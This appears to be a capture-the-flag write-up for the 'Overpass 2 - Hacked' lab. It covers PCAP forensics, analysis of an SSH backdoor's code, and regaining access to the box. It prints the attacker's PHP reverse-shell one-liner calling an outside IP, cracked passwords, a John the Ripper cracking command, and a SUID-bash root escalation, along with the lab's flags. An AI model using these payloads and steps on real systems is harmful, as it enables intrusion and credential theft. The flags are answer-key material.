# Overpass 2 - Hacked

---

## Task 1 - Forensics - Analyse the PCAP

> What was the URL of the page they used to upload a reverse shell?

`/development/`

> What payload did the attacker use to gain access?

`<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

> What password did the attacker use to privesc?

`whenevernoteartinstant`

PoC:

`tcp.stream eq 3`
`no : 91`

> How did the attacker establish persistence?

`https://github.com/NinjaJc01/ssh-backdoor`

PoC:

`tcp.stream eq 3`
`no : 91`

> Using the fasttrack wordlist, how many of the system passwords were crackable?

`4`

```
1qaz2wsx         (muirland)
abcd123          (szymex)
secret12         (bee)
whenevernoteartinstant	(james)
```
## Task 2 - Research - Analyse the code

> What's the default hash for the backdoor?

`bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`

`https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go`

> What's the hardcoded salt for the backdoor?

`1c362db832f3f864c8c2fe05f2002a05`

PoC:

`https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go`

> What was the hash that the attacker used?

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

> Crack the hash using rockyou and a cracking tool of your choice. What's the password?

`november16`

PoC:

`password$salt`

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05`

`echo "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05" > hash`

`john hash --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt`

## Task 3 - Attack - Get back in!

IP = `10.10.253.229`

> The attacker defaced the website. What message did they leave as a heading?

`H4ck3d by CooctusClan`

> Using the information you've found previously, hack your way back in!

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`ssh james@10.10.253.229 -p 2222 -oHostKeyAlgorithms=+ssh-rsa`

`james:november16`

> What's the user flag?

`thm{d119b4fa8c497ddb0525f7ad200e6567}`

> What's the root flag?

`thm{d53b2684f169360bb9606c333873144d}`

```
james@overpass-production:/home/james$ ls -la
total 1136
--SNIP--
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
--SNIP--
james@overpass-production:/home/james$

```

`./.suid_bash -p`

```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4#
```